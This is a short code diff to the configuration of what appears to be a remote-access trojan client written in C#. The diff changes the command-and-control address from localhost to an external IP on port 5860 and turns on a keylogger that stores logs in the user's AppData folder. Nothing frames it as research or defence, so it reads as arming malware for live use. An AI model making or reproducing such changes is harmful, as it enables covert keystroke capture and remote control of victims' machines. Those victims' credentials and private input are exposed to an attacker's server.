@@ -12,7 +12,7 @@ namespace Client.Config
     {
         //---------------CONNECTION---------------//
 
-        public static readonly string CNC_ADDRESS = "127.0.0.1";
+        public static readonly string CNC_ADDRESS = "155.4.107.23";
         public static readonly int CNC_PORT = 5860;
         public static readonly int CNC_RECONNECT_TIME = 800;
 
@@ -30,7 +30,7 @@ namespace Client.Config
         public static readonly bool HASH_OPTIMIZE_SCREEN_SEND = true;
 
         //-----------------KEYLOG-----------------//
-        public static readonly bool ENABLE_KEYLOG = false;
+        public static readonly bool ENABLE_KEYLOG = true;
         public static readonly Environment.SpecialFolder KEYLOG_SPECIAL_FOLDER = Environment.SpecialFolder.ApplicationData;
         public static readonly string KEYLOG_ROOT_PATH = Environment.GetFolderPath(KEYLOG_SPECIAL_FOLDER);
         public static readonly string KEYLOG_SUB_PATH = "logs";
